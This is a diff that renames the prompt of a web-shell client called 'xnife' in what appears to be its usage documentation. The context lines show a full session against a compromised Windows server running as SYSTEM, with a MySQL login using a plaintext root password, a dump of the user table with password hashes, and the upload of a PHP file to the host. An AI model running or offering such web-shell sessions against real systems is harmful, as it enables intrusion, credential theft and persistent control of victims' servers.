@@ -23,8 +23,8 @@ sql <host> <user> <passwd>      connect the database by the server.
 help                            show this page.
 any other system command        execute the command.
 
-xniffe->>
-xniffe->>help
+xnife->>
+xnife->>help
 
 get <remotePath>                download file from remotePath to current directory.
 put <localPath> <remotePath>    uploag file from localPath to remotePath.
@@ -32,12 +32,12 @@ sql <host> <user> <passwd>      connect the database by the server.
 help                            show this page.
 any other system command        execute the command.
 
-xniffe->>whoami
+xnife->>whoami
 nt authority\system
 
 [+]Execute successfully!
 
-xniffe->>dir
+xnife->>dir
  驱动器 D 中的卷是 新加卷
  卷的序列号是 B6E2-B7E5
 
@@ -76,7 +76,7 @@ xniffe->>dir
 
 [+]Execute successfully!
 
-xniffe->>sql
+xnife->>sql
 [-]Error:argument too many or too few.
 
 get <remotePath>                download file from remotePath to current directory.
@@ -85,26 +85,26 @@ sql <host> <user> <passwd>      connect the database by the server.
 help                            show this page.
 any other system command        execute the command.
 
-xniffe->>sql 127.0.0.1 root 526613
+xnife->>sql 127.0.0.1 root 526613
 You can execute sql now.
-xniffe-sql>>
-xniffe-sql>>select database()
+xnife-sql>>
+xnife-sql>>select database()
 
 |     database()    | | |
 | information_schema| | |
 
 [+]Execute successfully!
 
-xniffe-sql>>use mysql
+xnife-sql>>use mysql
 Database changed.
-xniffe-sql>>select database()
+xnife-sql>>select database()
 
 | database()| | |
 |   mysql   | | |
 
 [+]Execute successfully!
 
-xniffe-sql>>select user,password,host from user
+xnife-sql>>select user,password,host from user
 
 | user|                  password                |       host     | | |
 | root| *1B126DAB7C185C42D26AF5ECDB0ABE292B414D34|    localhost   | | |
@@ -114,14 +114,14 @@ xniffe-sql>>select user,password,host from user
 
 [+]Execute successfully!
 
-xniffe-sql>>exit
-xniffe->>get 1.php
+xnife-sql>>exit
+xnife->>get 1.php
 [+]Download 1.php to ./1.php
-xniffe->>get D:\123.png
+xnife->>get D:\123.png
 [+]Download D:\123.png to ./123.png
-xniffe->>put 1.php C:\1.php
+xnife->>put 1.php C:\1.php
 [+]Upload to C:\1.php.
-xniffe->>
-xniffe->> 
-xniffe->>exit
+xnife->>
+xnife->> 
+xnife->>exit
 PS C:\Users\Cknife>
